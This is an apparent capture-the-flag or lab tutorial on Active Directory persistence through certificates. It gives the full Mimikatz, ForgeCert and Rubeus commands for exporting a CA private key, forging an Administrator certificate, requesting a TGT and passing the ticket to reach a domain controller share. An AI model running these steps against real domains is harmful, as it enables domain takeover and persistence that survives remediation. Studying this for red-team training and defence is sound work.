# Persistence Through Certificates in Active Directory

> **Warning:**  
> The following techniques are highly invasive and difficult to remediate. Even with authorization, use extreme caution. In real-world scenarios, exploiting these methods often requires a full domain rebuild. Only proceed if you have explicit approval and fully understand the consequences. In most red team exercises, these persistence techniques are simulated rather than executed.

---

## Credential-Agnostic Persistence

Previous persistence methods relied on credentials, which defenders can rotate to remove access. To achieve more robust persistence, attackers may use techniques that are not affected by credential changes—such as abusing certificates.

---

## The Return of AD CS

In earlier exercises, certificates were used to escalate privileges to Domain Admin. Certificates can also be leveraged for persistence. With a valid certificate for Client Authentication, an attacker can continually request Ticket Granting Tickets (TGTs), regardless of account password changes. The only way to remove this access is to revoke or let the certificate expire—often years later.

For a refresher on requesting and using certificates for Kerberos authentication, refer to the Exploiting AD or AD Certificates Template rooms. Here, the focus is on compromising the Certificate Authority (CA) itself.

---

## Stealing the CA Private Key

If you have sufficient access, you can steal the root CA's private key and generate your own certificates at will. Certificates created this way cannot be revoked by the blue team, as they were never officially issued. The only remediation is to rotate the CA, invalidating all certificates and requiring a full re-issuance—a massive undertaking.

---

### Extracting the Private Key

The CA's private key is stored on the CA server. Unless protected by a Hardware Security Module (HSM), it is secured by the machine's Data Protection API (DPAPI). Tools like **Mimikatz** and **SharpDPAPI** can extract the CA certificate and private key.

**Example: Using Mimikatz to View Certificates**

```shell
mimikatz # crypto::certificates /systemstore:local_machine
```

If the key is not exportable, Mimikatz can patch memory to make it exportable:

```shell
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
```

**Exporting Certificates:**

```shell
mimikatz # crypto::certificates /systemstore:local_machine /export
```

Exported certificates will be saved in both PFX and DER formats. The `za-THMDC-CA.pfx` file is of particular interest. By default, Mimikatz uses the password `mimikatz` for exported PFX files.

---

## Generating Forged Certificates

With the CA certificate and private key, use **ForgeCert** to create a new client authentication certificate for any user:

```shell
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

**Parameter explanations:**
- `--CaCertPath`: Path to the exported CA certificate.
- `--CaCertPassword`: Password for the CA certificate (default: `mimikatz`).
- `--Subject`: Common name for the certificate (arbitrary).
- `--SubjectAltName`: UPN of the user to impersonate.
- `--NewCertPath`: Output path for the new certificate.
- `--NewCertPassword`: Password to protect the new certificate.

---

## Requesting a TGT with Rubeus

Use **Rubeus** to request a TGT using the forged certificate:

```shell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path_to_certificate> /password:<cert_password> /outfile:<output_file> /domain:za.tryhackme.loc /dc:<DC_IP>
```

**Parameter explanations:**
- `/user`: User to impersonate (must match UPN in certificate).
- `/enctype`: Encryption type (e.g., `aes256`).
- `/certificate`: Path to the generated certificate.
- `/password`: Password for the certificate file.
- `/outfile`: Output file for the TGT.
- `/domain`: Target domain.
- `/dc`: Domain controller IP (preferably one running CA services).

---

## Loading the TGT and Accessing Resources

Use **Mimikatz** to load the TGT and authenticate:

```shell
mimikatz # kerberos::ptt administrator.kirbi
```

You can now access resources as the impersonated user, e.g.:

```shell
dir \\THMDC.za.tryhackme.loc\c$\
```

---

## Why Certificate Persistence Is Dangerous

Certificate-based persistence is extremely difficult to defend against. Rotating account credentials does not invalidate the certificate. If the certificate was forged using a stolen CA key, it cannot be revoked through AD CS. The only solution is to revoke the root CA certificate, which invalidates all certificates issued by AD CS—requiring a complete re-issuance and potentially a full rebuild of affected systems.

---

> **Summary:**  
> Certificate persistence is a powerful and dangerous technique. It is rarely used in real-world red team exercises due to the risk and impact. Defenders must be aware of this threat and protect CA private keys with strong hardware-based security.

